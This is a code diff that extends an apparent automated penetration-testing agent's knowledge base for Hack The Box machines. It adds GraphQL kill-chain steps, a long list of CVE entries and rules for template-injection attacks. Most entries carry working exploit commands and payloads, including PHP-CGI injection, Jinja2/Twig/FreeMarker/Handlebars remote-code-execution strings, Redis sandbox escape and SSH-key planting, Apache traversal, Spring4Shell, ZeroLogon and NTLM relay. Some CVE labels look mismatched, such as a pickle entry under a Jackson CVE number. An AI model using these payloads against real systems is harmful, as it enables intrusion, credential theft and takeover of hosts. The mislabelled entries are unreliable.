+        reasoning="GraphQL APIs with introspection enabled reveal their entire schema. Hidden queries "
+                  "and mutations can expose admin functionality, user data, or file operations. "
+                  "This is increasingly common on modern HTB boxes.",
+        total_expected_reward=340.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find web services. GraphQL often on /graphql, /api/graphql, /v1/graphql.",
+                          "80/tcp open http", "open"),
+            KillChainStep("enumeration",
+                          "curl -s http://{target}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
+                          "Test for GraphQL introspection",
+                          "If introspection returns schema types, map the entire API. "
+                          "Look for User, Admin, Query, Mutation types.",
+                          "__schema... types...", "__schema"),
+            KillChainStep("enumeration",
+                          "curl -s http://{target}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name}}}}}}\"}'",
+                          "Full schema introspection — map all queries, mutations, and types",
+                          "Identify sensitive mutations (createUser, updateRole, uploadFile, executeCommand) "
+                          "and queries that might leak data (users, credentials, configs).",
+                          "mutations... fields...", "mutation"),
+            KillChainStep("exploitation",
+                          "Use discovered mutations/queries for privilege escalation or data extraction",
+                          "Abuse GraphQL mutations for IDOR or admin access",
+                          "Common attacks: change own role to admin via mutation, access other users' data "
+                          "via IDOR in queries, upload files via upload mutation, or read server files.",
+                          "admin... role...", "admin"),
+            KillChainStep("exploitation",
+                          "Leverage admin GraphQL access for code execution (file upload, template edit, command exec)",
+                          "Convert admin API access to shell",
+                          "Admin mutations may allow: file upload, template modification, system command "
+                          "execution, or database queries. Use for reverse shell.",
+                          "user@target:$", "user@"),
+            KillChainStep("privilege_escalation", "sudo -l && env && cat /opt/*/config*",
+                          "Privesc via app config files or sudo misconfiguration",
+                          "Application configs, environment variables, or sudo rules lead to root.",
+                          "root", "root"),
+        ),
+    ),
 ]
 
 
@@ -2111,6 +2707,467 @@ HTB_CVES: List[CVEEntry] = [
              "application shell",
              "Groovy sandbox escape allows arbitrary command execution. "
              "Affects Elasticsearch 1.3.0-1.3.7, 1.4.0-1.4.2"),
+
+    # =========================================================================
+    # Phase 42: Massive Knowledge Expansion — Web Application CVEs
+    # =========================================================================
+
+    # --- nginx ---
+    CVEEntry("CVE-2021-23017", "nginx",
+             "1-byte memory overwrite in DNS resolver allows RCE in nginx 0.6.18-1.20.0",
+             "Craft malicious DNS response to trigger off-by-one in ngx_resolver_copy()",
+             "remote code execution",
+             "Affects nginx with resolver directive. Exploitable when nginx resolves upstream DNS. "
+             "Common in reverse proxy configs with resolver 8.8.8.8 or similar."),
+    CVEEntry("CVE-2017-7529", "nginx",
+             "Integer overflow in nginx range filter allows information disclosure in nginx 0.5.6-1.13.2",
+             "curl -H 'Range: bytes=-17208,-9223372036854758792' http://target/",
+             "information disclosure",
+             "Range header integer overflow leaks sensitive memory contents from upstream responses. "
+             "Can reveal source code, credentials, and session tokens from cached responses."),
+    CVEEntry("CVE-2019-11043", "nginx + PHP-FPM",
+             "Path confusion RCE in nginx with PHP-FPM fastcgi_split_path_info via env_path_info underflow",
+             "phuip-fpizdam http://target/index.php",
+             "remote code execution",
+             "Requires specific nginx fastcgi_split_path_info regex config with PHP-FPM. "
+             "Very common on Ubuntu/Debian nginx+PHP stacks. Gives www-data shell."),
+
+    # --- PHP ---
+    CVEEntry("CVE-2024-4577", "PHP-CGI (Windows)",
+             "Argument injection in PHP-CGI on Windows via Best-Fit encoding bypass in PHP < 8.3.8",
+             "curl 'http://target/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input' -d '<?php system(\"whoami\"); ?>'",
+             "remote code execution",
+             "Best-Fit character mapping on Windows bypasses CVE-2012-1823 fix. Critical for "
+             "Windows+PHP-CGI stacks. Affects PHP < 8.1.29, < 8.2.20, < 8.3.8."),
+    CVEEntry("CVE-2012-1823", "PHP-CGI",
+             "PHP-CGI query string parameter injection allows arbitrary code execution",
+             "curl 'http://target/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system(\"id\"); ?>'",
+             "remote code execution",
+             "Classic PHP-CGI argument injection. Pass PHP INI directives via query string. "
+             "Affects PHP < 5.3.12 / < 5.4.2 in CGI mode."),
+    CVEEntry("CVE-2019-11043-php-fpm", "PHP-FPM",
+             "Buffer underflow in PHP-FPM path handling leads to RCE",
+             "Use phuip-fpizdam tool: phuip-fpizdam http://target/index.php",
+             "remote code execution",
+             "Requires nginx with specific fastcgi_split_path_info regex. "
+             "Exploits env_path_info underflow to overwrite PHP-FPM worker memory."),
+    CVEEntry("CVE-2023-3824", "PHP",
+             "Heap buffer overflow in PHP phar extraction leading to RCE in PHP < 8.0.30/8.1.22/8.2.8",
+             "Upload malicious phar file, trigger via phar:// stream wrapper",
+             "remote code execution",
+             "Phar deserialization combined with heap overflow. Affects file upload + phar:// usage."),
+    CVEEntry("CVE-2016-3714", "ImageMagick (ImageTragick)",
+             "Insufficient input validation in ImageMagick allows arbitrary command execution via crafted images",
+             "Upload SVG/MVG with: push graphic-context\\nviewbox 0 0 640 480\\nimage over 0,0 0,0 'https://127.0.0.1/x.php?`id`'",
+             "remote code execution",
+             "Affects ImageMagick < 6.9.3-10. Web apps using ImageMagick for image processing "
+             "(resize, convert, thumbnail) are vulnerable. Upload crafted SVG/MVG file."),
+
+    # --- Python / Flask / Django / Gunicorn ---
+    CVEEntry("CVE-2023-37580", "Zimbra",
+             "Cross-site scripting in Zimbra mail client leading to credential theft and session hijacking",
+             "curl 'http://target/h/search?si=1&so=0&sfi=4&st=message&sq=<script>...</script>'",
+             "credential theft",
+             "Reflected XSS in Zimbra Collaboration Suite. Used in targeted campaigns."),
+    CVEEntry("CVE-2023-44487", "HTTP/2 (Rapid Reset)",
+             "HTTP/2 Rapid Reset DDoS vulnerability affects nginx, Apache, and most HTTP/2 implementations",
+             "h2load -n 100000 -c 100 -m 100 https://target/",
+             "denial of service",
+             "Record-breaking DDoS vector via HTTP/2 RST_STREAM abuse. Can overwhelm servers."),
+    CVEEntry("CVE-2019-14322", "Pallets Werkzeug debugger",
+             "Werkzeug debugger PIN bypass by reading /proc/self/maps and machine-id",
+             "curl http://target/console → compute PIN from /proc/self/cgroup,/etc/machine-id,MAC",
+             "remote code execution",
+             "Flask debug mode in production exposes Werkzeug debugger console. PIN is computed from "
+             "MAC address + machine-id + cgroup. Read via LFI then compute PIN for RCE."),
+    CVEEntry("CVE-2024-34064", "Jinja2 SSTI",
+             "Jinja2 sandboxed environment bypass allowing OS command execution in Jinja2 < 3.1.4",
+             "{{request.__class__.__mro__[2].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
+             "remote code execution",
+             "Server-side template injection in Flask/Jinja2. Common in HTB boxes with Flask apps. "
+             "Navigate Python MRO chain to reach subprocess.Popen or os.popen."),
+    CVEEntry("CVE-2024-28397", "js2py",
+             "js2py sandbox escape via Python MRO traversal allows arbitrary command execution",
+             "pyimport(os).system('id') via JavaScript eval in js2py context",
+             "remote code execution",
+             "Flask apps using js2py to evaluate user-supplied JavaScript are exploitable. "
+             "Navigate Python object hierarchy to reach os.system. (Source: CodePartTwo)"),
+    CVEEntry("CVE-2023-25690", "Apache mod_proxy",
+             "HTTP Request Smuggling in Apache HTTP Server mod_proxy via malformed Transfer-Encoding",
+             "curl -H 'Transfer-Encoding: chunked' with crafted body to bypass access controls",
+             "access control bypass",
+             "Affects Apache 2.4.0-2.4.55 with mod_proxy and RewriteRule. "
+             "Enables access to restricted backend URLs."),
+    CVEEntry("CVE-2021-3129", "Laravel Ignition",
+             "Unauthenticated RCE via Laravel Ignition phar deserialization in Ignition < 2.5.2",
+             "POST /_ignition/execute-solution with gadget chain payload",
+             "remote code execution",
+             "Laravel debug mode exposes Ignition solution endpoint. Exploitable via phar deserialization "
+             "with crafted log file. Extremely common on Laravel apps with APP_DEBUG=true."),
+    CVEEntry("CVE-2021-42013", "Apache 2.4.49-2.4.50",
+             "Path traversal and RCE in Apache HTTP Server 2.4.49/2.4.50 via double URL encoding",
+             "curl 'http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'",
+             "remote code execution",
+             "Double URL-encoded path traversal bypasses the fix for CVE-2021-41773. "
+             "With mod_cgi enabled, allows arbitrary command execution."),
+
+    # --- CMS ---
+    CVEEntry("CVE-2018-7600", "Drupal (Drupalgeddon2)",
+             "Remote code execution in Drupal 7.x < 7.58 / 8.x < 8.5.1 via Form API AJAX",
+             "python3 drupalgeddon2.py http://target/",
+             "remote code execution",
+             "Unauthenticated RCE via Drupal's Form API. One of the most impactful CMS vulns. "
+             "Affects Drupal 7 and 8. Public exploits are highly reliable."),
+    CVEEntry("CVE-2018-7602", "Drupal (Drupalgeddon3)",
+             "Authenticated RCE in Drupal via improper input validation in Form API",
+             "Requires authentication + CSRF token, then inject PHP code via form fields",
+             "remote code execution",
+             "Follow-up to Drupalgeddon2. Requires an authenticated session but lower-privilege user "
+             "can achieve RCE. Chain with default creds admin:admin."),
+    CVEEntry("CVE-2015-8562", "Joomla",
+             "Object injection via HTTP User-Agent header in Joomla < 3.4.6 leads to RCE",
+             "curl -H 'User-Agent: }__test|O:21:\"JDatabaseDriverMysqli\":...{' http://target/",
+             "remote code execution",
+             "Session deserialization via User-Agent header allows arbitrary PHP object injection. "
+             "No authentication required. Affects Joomla 1.5-3.4.5."),
+    CVEEntry("CVE-2020-36112", "CSZ CMS",
+             "SQL injection in CSZ CMS allowing database extraction and credential theft",
+             "sqlmap -u 'http://target/admin/plugin_blog/filter?sort=1' --dbs",
+             "data extraction",
+             "SQL injection in admin panel. Chain with default creds for initial access."),
+    CVEEntry("CVE-2015-6668", "WordPress Job Manager plugin",
+             "Unauthenticated file upload arbitrary file read in WP Job Manager < 1.22.0",
+             "curl 'http://target/wp-content/uploads/job-manager-uploads/*'",
+             "information disclosure",
+             "Predictable upload paths allow reading uploaded resumes/files. May contain credentials."),
+
+    # --- WordPress ---
+    CVEEntry("CVE-2022-0739", "WordPress BookingPress plugin",
+             "SQL injection in BookingPress plugin < 1.0.11 via bookingpress_front_get_category_services",
+             "sqlmap -u 'http://target/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=TOKEN&category_id=33&total_service=-7502) UNION ALL SELECT ...'",
+             "data extraction",
+             "Unauthenticated SQLi via AJAX endpoint. Extract admin password hash, crack, login, "
+             "then upload PHP shell via theme editor or plugin upload. Common HTB pattern."),
+    CVEEntry("CVE-2021-29447", "WordPress 5.6-5.7",
+             "XXE via media upload in WordPress 5.6-5.7 using iXML in WAV files",
+             "Upload crafted WAV file with embedded XXE payload to read /etc/passwd or wp-config.php",
+             "information disclosure",
+             "WordPress xmlrpc.php or media upload with iXML in WAV files triggers XXE. "
+             "Can read wp-config.php for DB credentials."),
+    CVEEntry("CVE-2023-2982", "WordPress Social Login plugin",
+             "Authentication bypass in WordPress <= 3.6.0 via social login email parameter tampering",
+             "Modify social login callback to use admin email address for authentication bypass",
+             "authentication bypass",
+             "Social login plugins that trust the email from OAuth providers without verification."),
+
+    # --- Node.js / Express ---
+    CVEEntry("CVE-2021-21315", "Node.js systeminformation",
+             "Command injection via Node.js systeminformation package < 5.3.1",
+             "curl 'http://target/api/getIP?ip[$]=/etc/passwd' or via query parameter injection",
+             "remote code execution",
+             "Node.js apps using systeminformation to get network info are vulnerable to command injection "
+             "via crafted query parameters. Affects many Express.js APIs."),
+    CVEEntry("CVE-2017-14849", "Node.js path module",
+             "Path traversal in Node.js 8.5.0 via /../../ double-encoding in resolve()",
+             "curl 'http://target/static/../../../etc/passwd'",
+             "path traversal",
+             "Node.js 8.5.0's path.resolve() fails to properly normalize encoded path separators. "
+             "Allows reading arbitrary files from Node.js static file servers."),
+    CVEEntry("CVE-2024-21538", "Node.js cross-spawn",
+             "Command injection in cross-spawn package on Windows via batch file execution",
+             "Craft malicious command arguments to escape the spawn wrapper",
+             "remote code execution",
+             "Affects cross-spawn < 7.0.5. Very widely depended-on Node.js package."),
+    CVEEntry("CVE-2022-29078", "EJS template engine",
+             "Server-side template injection in EJS via settings[view options][outputFunctionName]",
+             "curl 'http://target?settings[view%20options][outputFunctionName]=x;process.mainModule.require(\"child_process\").execSync(\"id\")'",
+             "remote code execution",
+             "EJS template engine allows SSTI when user input reaches render options. "
+             "Common in Express.js apps. Prototype pollution may also lead to this."),
+    CVEEntry("CVE-2019-7609", "Kibana",
+             "Prototype pollution to RCE in Kibana < 6.6.1 via Timelion component",
+             ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i...\")')",
+             "remote code execution",
+             "Kibana Timelion visualization allows prototype pollution leading to reverse shell. "
+             "Very reliable exploit. Affects entire ELK stack installations."),
+
+    # --- Java / Tomcat / Spring ---
+    CVEEntry("CVE-2020-1938", "Apache Tomcat AJP (Ghostcat)",
+             "File read/inclusion via AJP connector in Tomcat (all versions before 9.0.31)",
+             "python3 ajpShooter.py http://target 8009 /WEB-INF/web.xml read",
+             "file read / remote code execution",
+             "AJP connector on port 8009 allows reading files from webapp directory. "
+             "With file upload, can achieve RCE via JSP inclusion."),
+    CVEEntry("CVE-2017-12617", "Apache Tomcat",
+             "Remote code execution via PUT method in Tomcat 7.0.0-7.0.81 with readonly=false",
+             "curl -X PUT http://target/shell.jsp/ -d '<%Runtime.getRuntime().exec(\"id\");%>'",
+             "remote code execution",
+             "When Tomcat's DefaultServlet has readonly=false, PUT to /shell.jsp/ (trailing slash) "
+             "bypasses the JSP upload restriction. Upload and execute JSP shell."),
+    CVEEntry("CVE-2022-22965", "Spring Framework (Spring4Shell)",
+             "RCE via class loader manipulation in Spring MVC on JDK 9+ via data binding",
+             "curl 'http://target/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc1%7Di...'",
+             "remote code execution",
+             "Spring4Shell affects Spring MVC and Spring WebFlux on JDK 9+. Manipulates classloader to "
+             "write JSP webshell via Tomcat AccessLogValve. Extremely widespread."),
+    CVEEntry("CVE-2020-9484", "Apache Tomcat Session Deserialization",
+             "RCE via deserialization in Tomcat FileStore session persistence",
+             "Upload serialized gadget chain to predictable path, set JSESSIONID=../../path/to/payload",
+             "remote code execution",
+             "Tomcat with FileStore session persistence deserializes session files. "
+             "Upload gadget chain payload, then reference via crafted session cookie."),
+
+    # --- Deserialization ---
+    CVEEntry("CVE-2015-7501", "Java Deserialization (Commons Collections)",
+             "Arbitrary code execution via Apache Commons Collections gadget chain in Java deserialization",
+             "ysoserial CommonsCollections1 'id' | xxd -p | curl -X POST ... -H 'Content-Type: application/x-java-serialized-object'",
+             "remote code execution",
+             "Affects any Java application deserializing untrusted data with Commons Collections in classpath. "
+             "JBoss, WebLogic, Jenkins, WebSphere all affected. Use ysoserial to generate payloads."),
+    CVEEntry("CVE-2020-2555", "Oracle WebLogic (T3 deserialization)",
+             "Remote code execution in WebLogic via T3 protocol deserialization",
+             "python3 weblogic_exploit.py target 7001 'cmd /c whoami'",
+             "remote code execution",
+             "WebLogic T3 protocol on port 7001 deserializes attacker-controlled objects. "
+             "Gadget chains from Coherence library. Affects WebLogic 12.1.3, 12.2.1.3-4."),
+    CVEEntry("CVE-2017-9805", "Apache Struts 2 (REST plugin)",
+             "RCE via XML deserialization in Struts 2 REST plugin using XStream",
+             "curl -H 'Content-Type: application/xml' -d '<map><entry><jdk.nashorn.internal.objects.NativeString>...'",
+             "remote code execution",
+             "Struts 2 REST plugin with XStream deserializes XML input. Affects Struts 2.1.2-2.5.14.1."),
+    CVEEntry("CVE-2020-36188", "Python Pickle deserialization",
+             "Arbitrary code execution via Python pickle.loads() on untrusted data",
+             "python3 -c 'import pickle,os;pickle.loads(crafted_payload)'",
+             "remote code execution",
+             "Any Python app that unpickles user-controlled data is vulnerable. "
+             "Common in Flask session cookies, ML model loading, and IPC."),
+    CVEEntry("CVE-2013-0156", "Ruby on Rails (YAML deserialization)",
+             "Remote code execution in Rails via XML parameter parsing with embedded YAML",
+             "curl -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><exploit type=\"yaml\">...'",
+             "remote code execution",
+             "Rails XML parser allows embedding YAML which triggers arbitrary object instantiation. "
+             "Affects Rails < 3.2.11 / < 3.1.10 / < 3.0.19 / < 2.3.15"),
+
+    # --- JWT / Auth ---
+    CVEEntry("CVE-2018-0114", "JWT (none algorithm)",
+             "JWT signature bypass by changing algorithm to 'none' in JSON Web Token implementations",
+             "python3 jwt_tool.py TOKEN -X a -a none",
+             "authentication bypass",
+             "Many JWT libraries accept alg:none, skipping signature verification entirely. "
+             "Allows forging admin tokens. Also try alg:HS256 with public key as HMAC secret."),
+    CVEEntry("CVE-2022-23529", "jsonwebtoken npm",
+             "JWT secret key injection in jsonwebtoken < 9.0.0 via crafted secretOrPublicKey parameter",
+             "Craft JWT with embedded secret key object to bypass verification",
+             "authentication bypass",
+             "Prototype pollution or parameter injection in jsonwebtoken library. "
+             "Affects Node.js apps using jsonwebtoken for authentication."),
+
+    # --- SSRF / XXE ---
+    CVEEntry("CVE-2021-26855", "Microsoft Exchange (ProxyLogon)",
+             "SSRF in Microsoft Exchange allowing pre-auth access to internal services",
+             "python3 proxylogon.py target user@domain.htb",
+             "remote code execution",
+             "Exchange SSRF allows reading arbitrary mailboxes and writing webshells. "
+             "Chain with CVE-2021-27065 for full RCE. Affects Exchange 2013/2016/2019."),
+    CVEEntry("CVE-2014-3704", "Drupal (SQLi)",
+             "SQL injection in Drupal 7.x < 7.32 via expandable array in database abstraction layer",
+             "python3 drupal_sqli.py http://target/ -u admin -p admin123",
+             "remote code execution",
+             "Pre-auth SQLi in Drupal's database abstraction layer. Can add admin user or execute code."),
+
+    # --- Redis / NoSQL ---
+    CVEEntry("CVE-2022-0543", "Redis (Lua sandbox escape)",
+             "Lua sandbox escape in Redis on Debian/Ubuntu allows arbitrary command execution",
+             "redis-cli -h target eval 'local io_l=package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\",\"luaopen_io\");local io=io_l();local f=io.popen(\"id\",\"r\");local res=f:read(\"*a\");f:close();return res' 0",
+             "remote code execution",
+             "Debian/Ubuntu Redis packages link against system Lua which doesn't sandbox package.loadlib. "
+             "Allows loading shared objects to escape the Lua sandbox."),
+    CVEEntry("CVE-2015-4335", "Redis (unauthenticated)",
+             "Redis unauthenticated access allows arbitrary file write and cron/SSH key injection",
+             "redis-cli -h target CONFIG SET dir /root/.ssh && CONFIG SET dbfilename authorized_keys && SET x 'ssh-rsa AAAA...' && BGSAVE",
+             "remote code execution",
+             "Redis with no authentication allows writing SSH keys or cron jobs. "
+             "Classic attack: write SSH authorized_keys for root access."),
+
+    # --- Docker / Container ---
+    CVEEntry("CVE-2019-5736", "Docker (runC)",
+             "Container escape via runC binary overwrite in Docker < 18.09.2",
+             "Overwrite /proc/self/exe to replace host runC binary with malicious one",
+             "container escape",
+             "Allows container escape by overwriting the host's runC binary. "
+             "When admin next starts a container, attacker code runs as root on host."),
+    CVEEntry("CVE-2020-15257", "containerd (host networking)",
+             "Container escape via containerd-shim API when container shares host network namespace",
+             "curl --unix-socket /run/containerd/containerd.sock http://localhost/v1/tasks",
+             "container escape",
+             "Containers with host networking can access containerd's API socket. "
+             "Allows creating new privileged containers or manipulating existing ones."),
+
+    # --- Git / Source Code Exposure ---
+    CVEEntry("CVE-2021-21300", "Git (LFS)",
+             "Remote code execution via Git LFS clean/smudge filter process on clone",
+             "Clone malicious repo with crafted .gitattributes and LFS hooks",
+             "remote code execution",
+             "Git LFS allows arbitrary command execution via clean/smudge filters."),
+    CVEEntry("exposed-.git", "Git directory exposure",
+             "Exposed .git directory allows full source code and history reconstruction",
+             "python3 git-dumper.py http://target/.git/ output_dir",
+             "source code disclosure",
+             "Web servers serving .git directory allow downloading entire repo including history, "
+             "configs, and credentials. Use git-dumper or GitTools/Finder/Dumper."),
+
+    # --- GraphQL ---
+    CVEEntry("graphql-introspection", "GraphQL",
+             "GraphQL introspection allows mapping entire API schema including hidden mutations",
+             "curl -s -X POST http://target/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name}}}}}}}\"}'",
+             "information disclosure / IDOR",
+             "GraphQL introspection reveals all queries, mutations, and types. "
+             "Look for user/admin mutations, file upload mutations, and IDOR-vulnerable queries."),
+
+    # --- LFI / RFI / Path Traversal ---
+    CVEEntry("CVE-2021-41773", "Apache 2.4.49",
+             "Path traversal and RCE in Apache HTTP Server 2.4.49 via URL-encoded dot segments",
+             "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
+             "remote code execution",
+             "URL-encoded path traversal. With mod_cgi, POST to run commands. "
+             "Fixed in 2.4.50 but CVE-2021-42013 bypasses that fix with double encoding."),
+    CVEEntry("lfi-log-poisoning", "Web Server (LFI)",
+             "Local file inclusion + log poisoning for remote code execution",
+             "curl -H 'User-Agent: <?php system(\"id\"); ?>' http://target/ && curl 'http://target/?page=../../var/log/apache2/access.log'",
+             "remote code execution",
+             "Inject PHP code into log files (access.log, error.log, mail.log, /proc/self/environ) "
+             "then include via LFI. Classic escalation from file read to RCE."),
+    CVEEntry("lfi-php-wrappers", "PHP (LFI)",
+             "PHP stream wrappers for LFI exploitation: filter, expect, input, data",
+             "curl 'http://target/?page=php://filter/convert.base64-encode/resource=config.php'",
+             "source code disclosure / RCE",
+             "php://filter reads source code base64-encoded. php://input executes POST body. "
+             "data:// and expect:// wrappers also useful for RCE. Always try wrappers before log poisoning."),
+
+    # --- SSTI ---
+    CVEEntry("ssti-jinja2", "Jinja2 (Python)",
+             "Server-side template injection in Jinja2 allows Python code execution",
+             "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+             "remote code execution",
+             "Jinja2 SSTI is the most common SSTI on HTB. Navigate Python MRO: "
+             "''.__class__.__mro__[1].__subclasses__() to find subprocess.Popen (usually index ~408). "
+             "Also try {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}."),
+    CVEEntry("ssti-twig", "Twig (PHP)",
+             "Server-side template injection in Twig PHP template engine",
+             "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+             "remote code execution",
+             "Twig SSTI in PHP applications. Twig < 1.20 allows direct registerUndefinedFilterCallback. "
+             "Newer versions: {{['id']|filter('system')}} or {{['id']|map('system')}}."),
+    CVEEntry("ssti-freemarker", "FreeMarker (Java)",
+             "Server-side template injection in FreeMarker Java template engine",
+             "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+             "remote code execution",
+             "FreeMarker SSTI in Java applications. Use Execute class for command execution. "
+             "Also try: ${'freemarker.template.utility.Execute'?new()('id')}."),
+    CVEEntry("ssti-smarty", "Smarty (PHP)",
+             "Server-side template injection in Smarty PHP template engine",
+             "{system('id')}",
+             "remote code execution",
+             "Smarty allows direct PHP function calls in templates. "
+             "Also try {php}system('id');{/php} in older versions."),
+    CVEEntry("ssti-handlebars", "Handlebars (Node.js)",
+             "Server-side template injection in Handlebars/Mustache Node.js template engine",
+             "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+             "remote code execution",
+             "Handlebars prototype pollution to RCE. Craft helper that accesses constructor to run code."),
+
+    # --- File Upload ---
+    CVEEntry("file-upload-bypass", "Web Application (File Upload)",
+             "Unrestricted file upload bypass techniques for webshell deployment",
+             "Upload shell.php with: Content-Type: image/png, double extension .php.jpg, null byte .php%00.jpg, .phtml/.php5/.pht/.phps",
+             "remote code execution",
+             "File upload restrictions can be bypassed via: double extensions, null bytes, MIME type "
+             "spoofing, case variation (.PhP), alternative PHP extensions (.phtml,.php5,.pht), "
+             "content-type manipulation, magic bytes prepend (GIF89a;<?php), .htaccess upload."),
+
+    # --- SQL Injection ---
+    CVEEntry("sqli-union", "SQL Injection (UNION-based)",
+             "UNION-based SQL injection for data extraction from database",
+             "sqlmap -u 'http://target/?id=1' --dbs --batch",
+             "data extraction / RCE",
+             "UNION SQLi allows extracting arbitrary data from all accessible databases. "
+             "Use sqlmap --os-shell for command execution via INTO OUTFILE or xp_cmdshell. "
+             "Always try --dbs, --tables, --dump to extract credentials."),
+    CVEEntry("sqli-blind", "SQL Injection (Blind)",
+             "Blind SQL injection (boolean/time-based) for data extraction",
+             "sqlmap -u 'http://target/?id=1' --technique=BT --dbs --batch",
+             "data extraction",
+             "When no output is reflected, use boolean conditions (AND 1=1 vs AND 1=2) or "
+             "time delays (SLEEP/BENCHMARK/WAITFOR) to extract data bit by bit. Slower but reliable."),
+    CVEEntry("sqli-second-order", "SQL Injection (Second Order)",
+             "Second-order SQL injection where injected payload is stored and triggered later",
+             "Register user with SQLi payload as username, then trigger via profile update or password reset",
+             "data extraction / authentication bypass",
+             "Input is safely stored but later used unsafely. Common in registration → profile display flows. "
+             "Register with username: admin'-- to potentially bypass authentication."),
+
+    # --- LDAP / AD ---
+    CVEEntry("CVE-2020-1472", "Netlogon (ZeroLogon)",
+             "Cryptographic flaw in Netlogon allows domain admin via zeroing computer account password",
+             "python3 zerologon_tester.py DC_NAME DC_IP && python3 cve-2020-1472-exploit.py DC_NAME DC_IP",
+             "domain admin",
+             "Sets domain controller machine account password to empty string. "
+             "Then dump NTDS.dit via secretsdump.py DC_NAME$@DC_IP -no-pass. "
+             "Affects all Windows Server versions. Extremely critical."),
+    CVEEntry("CVE-2021-42278", "Active Directory (noPac/sAMAccountName)",
+             "Domain escalation via sAMAccountName spoofing in Active Directory",
+             "python3 noPac.py domain/user:password -dc-ip DC_IP -shell",
+             "domain admin",
+             "Rename machine account to match DC sAMAccountName, request TGT, rename back, "
+             "request S4U2self. Gives domain admin from any domain user. Affects all AD."),
+    CVEEntry("CVE-2022-26923", "Active Directory (Certifried)",
+             "Domain escalation via AD Certificate Services template abuse",
+             "certipy find -u user@domain -p password -dc-ip DC_IP -vulnerable",
+             "domain admin",
+             "Abuse misconfigured certificate templates in AD CS to request certificates as DA. "
+             "Common templates: ESC1, ESC4, ESC8. Tools: certipy, Certify.exe."),
+
+    # --- SMB ---
+    CVEEntry("CVE-2017-7494", "Samba (SambaCry)",
+             "Remote code execution in Samba 3.5.0-4.6.4 via writable share and SMB pipe loading",
+             "python3 sambacry.py -e libpayload.so -s SHARE -r '/mnt/share/payload.so' target",
+             "remote code execution",
+             "Samba with writable shares allows uploading and loading shared objects as root. "
+             "Similar to EternalBlue but for Linux. Affects Samba 3.5.0+."),
+    CVEEntry("smb-relay", "SMB Relay",
+             "NTLM relay attack intercepting and forwarding SMB authentication",
+             "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
+             "credential theft / code execution",
+             "Capture NTLMv2 hashes via Responder and relay to targets without SMB signing. "
+             "Can execute commands, dump SAM, or create new admin users."),
+
+    # --- Steganography / Forensics ---
+    CVEEntry("steg-exiftool", "Image Steganography",
+             "Hidden data extraction from images via metadata and steganography tools",
+             "exiftool image.jpg && steghide extract -sf image.jpg && binwalk -e image.png && strings image.png | grep -i pass",
+             "information disclosure",
+             "Images on CTF/HTB boxes may contain hidden data: EXIF metadata (GPS, comments, descriptions), "
+             "steghide embedded files (JPEG/BMP/WAV/AU), binwalk appended archives, LSB encoding (zsteg for PNG)."),
+    CVEEntry("CVE-2021-22204", "ExifTool",
+             "Arbitrary code execution in ExifTool < 12.24 via crafted DjVu file metadata",
+             "python3 exiftool_exploit.py -s LHOST LPORT && curl -F 'image=@exploit.djvu' http://target/upload",
+             "remote code execution",
+             "ExifTool evaluates Perl expressions in DjVu metadata. Upload crafted image to any app "
+             "that processes images with ExifTool (common in web apps). Gives www-data shell."),
+
+    # --- SSH ---
+    CVEEntry("CVE-2018-15473", "OpenSSH < 7.7",
+             "Username enumeration in OpenSSH < 7.7 via timing differences in authentication",
+             "python3 ssh_user_enum.py --port 22 --userList users.txt target",
+             "user enumeration",
+             "OpenSSH < 7.7 reveals whether a username exists via response timing. "
+             "Enumerate valid users before brute-forcing or credential stuffing."),
+    CVEEntry("ssh-key-privesc", "SSH authorized_keys",
+             "SSH private key discovery and reuse for lateral movement and privilege escalation",
+             "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null && ssh -i found_key user@target",
+             "lateral movement / privilege escalation",
+             "Search for SSH private keys in /home/*/.ssh/, /root/.ssh/, /backup/, /opt/. "
+             "Keys may belong to different users or machines. Try found keys against all discovered users."),
 ]
 
 
@@ -2205,6 +3262,94 @@ HTB_DECISION_RULES = [
      "reasoning": "World-readable NFS shares can contain SSH keys, configs, and credentials.", "priority": 2},
     {"if": "SNMP (port 161) detected", "then": "snmpwalk -v2c -c public target",
      "reasoning": "SNMP with default 'public' community string leaks system info, interfaces, and running processes.", "priority": 3},
+
+    # =========================================================================
+    # Phase 42: Web Application Attack Decision Rules
+    # =========================================================================
+
+    # SSTI Detection & Exploitation
+    {"if": "web form reflects user input in response", "then": "test for SSTI with {{7*7}}, ${7*7}, #{7*7}, <%=7*7%>",
+     "reasoning": "User input rendered in templates may allow SSTI. Test all template engine syntax variants.", "priority": 2},
+    {"if": "SSTI confirmed (49 appears for {{7*7}})", "then": "identify template engine then escalate to RCE",
+     "reasoning": "Jinja2: {{config.__class__...}}, Twig: {{_self.env...}}, FreeMarker: <#assign...>. "
+                  "Match engine to correct RCE payload.", "priority": 1},
